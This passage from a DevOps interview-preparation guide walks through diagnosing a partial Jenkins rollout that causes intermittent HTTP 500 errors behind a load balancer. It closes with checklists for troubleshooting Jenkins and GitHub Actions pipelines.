The interviewer gives you this situation:

> "Your company uses GitHub Actions for CI and Jenkins for production deployment. A developer merges a pull request into `main`. GitHub Actions completes successfully and produces Docker image `registry.example.com/payments:84d72bf`. Jenkins automatically begins the production deployment. Jenkins reports SUCCESS. Ten minutes later, monitoring shows that approximately 50 percent of payment requests are returning HTTP 500. The application runs on four backend servers behind a load balancer. What do you do?"

A strong junior DevOps candidate should start by building a timeline.

```text
Merge to main
      ↓
GitHub Actions
      ↓
Build successful
      ↓
Image:
payments:84d72bf
      ↓
Jenkins deployment
      ↓
Reported SUCCESS
      ↓
50% HTTP 500
```

The fact that approximately half of requests fail is important.

It suggests the problem may not affect every backend equally.

A possible environment might be:

```text
Load Balancer
   │
   ├── Server 1 → healthy
   ├── Server 2 → healthy
   ├── Server 3 → failing
   └── Server 4 → failing
```

First, verify the deployed version on every backend.

Suppose:

```text
Server 1 → payments:84d72bf
Server 2 → payments:84d72bf
Server 3 → payments:7a91cc2
Server 4 → payments:7a91cc2
```

Now I know Jenkins did not complete the rollout consistently.

Perhaps the deployment script updated two servers and then incorrectly returned exit code 0 before finishing the others.

Or Jenkins ran deployment steps in parallel and two hosts failed silently.

I would inspect the Jenkins deployment log carefully.

Look for the first meaningful deployment error.

Suppose:

```text
Server 1 updated successfully
Server 2 updated successfully
Server 3: permission denied
Server 4: permission denied
Deployment completed
```

And then the script runs:

```bash
exit 0
```

The Jenkins job becomes green despite a partial deployment.

But imagine the old and new versions are not compatible with a recently applied database change.

Requests hitting:

```text
84d72bf
```

work.

Requests hitting:

```text
7a91cc2
```

fail.

That produces intermittent HTTP 500 errors.

The immediate response would depend on which state is safer.

Possible options include:

```text
Complete rollout to the known-good new version
```

or:

```text
Roll back all servers to the previous known-good version
```

The choice depends on application and database compatibility.

Then verify every backend.

For example:

```bash
curl http://server1:8080/version
curl http://server2:8080/version
curl http://server3:8080/version
curl http://server4:8080/version
```

I would also verify through the load balancer.

After recovery, fix the pipeline.

The deployment script should fail if any backend deployment fails.

The pipeline should also verify version consistency.

For example:

```text
Deploy
   ↓
Verify all hosts
   ↓
Health checks
   ↓
Version checks
   ↓
Smoke tests
   ↓
Success
```

The pipeline should not report success simply because:

```text
The script reached the end.
```

## Strong interview response

A strong candidate might say:

> "Because only part of the traffic fails, I would suspect inconsistent backend state before assuming the entire application is broken. I would identify the exact artifact created by GitHub Actions, confirm what version each backend is running, inspect Jenkins deployment logs for partial failures, and compare failing backends with healthy ones. If the rollout is mixed, I would restore all backends to a consistent known-good state, verify through the load balancer, and then fix the Jenkins deployment so any failed target causes the pipeline to fail and post-deployment verification confirms every backend runs the intended version."

That answer demonstrates:

```text
GitHub Actions understanding
+
Jenkins troubleshooting
+
Deployment reasoning
+
Load balancer reasoning
+
Production recovery
```

# What Junior DevOps Candidates Should Learn From Part 7

Jenkins and GitHub Actions are different tools, but many failures follow the same structure.

```text
Event
  ↓
Trigger
  ↓
Controller / Workflow Engine
  ↓
Agent / Runner
  ↓
Checkout
  ↓
Environment
  ↓
Credentials
  ↓
Build
  ↓
Test
  ↓
Artifact
  ↓
Deployment
  ↓
Verification
```

When troubleshooting Jenkins, ask:

1. Did the job trigger?
2. Is it queued?
3. Is the required agent available?
4. Does the agent have the right tools?
5. Does the job run under the expected user?
6. Are credentials available?
7. Which stage failed?
8. Did shell commands return correct exit codes?
9. Was the correct artifact produced?
10. Did deployment reach every target?
11. Was production actually verified?

When troubleshooting GitHub Actions, ask:

1. Did the event match the workflow trigger?
2. Did branch or path filters match?
3. Was a runner allocated?
4. Is the correct code checked out?
5. Is the working directory correct?
6. Are secrets available in this security context?
7. Did dependencies or cache cause the problem?
8. Did required jobs run?
9. Did artifacts move correctly?
10. Did the intended environment receive the deployment?
11. Was runtime health verified?

Useful Jenkins concepts from this part include:

```text
Jenkinsfile
Controller
Agent
Executor
Stage
Workspace
Credentials
Shared Library
Agent Labels
Post Actions
```

Useful GitHub Actions concepts include:

```text
Workflow
Job
Step
Runner
Event
Secrets
Environment
Matrix
Artifacts
needs
Concurrency
Reusable Workflows
```

The most important concept is not Jenkins syntax or GitHub Actions YAML.

It is this:

```text
A CI/CD platform coordinates work.

It does not guarantee that the work produced a healthy production system.
```

A pipeline can report:

```text
SUCCESS
```

while production is:

```text
Partially deployed
Misconfigured
Unhealthy
Running the wrong version
```

That is why strong DevOps pipelines should answer:

```text
What commit triggered this?

Which artifact was created?

Which identity performed the deployment?

Where was it deployed?

Did every target receive it?

Did the application become ready?

Did real traffic succeed?

Can we safely roll back?
```

A junior candidate who can reason through those questions is demonstrating genuine CI/CD understanding rather than simply knowing where the "Run workflow" or "Build Now" button is.
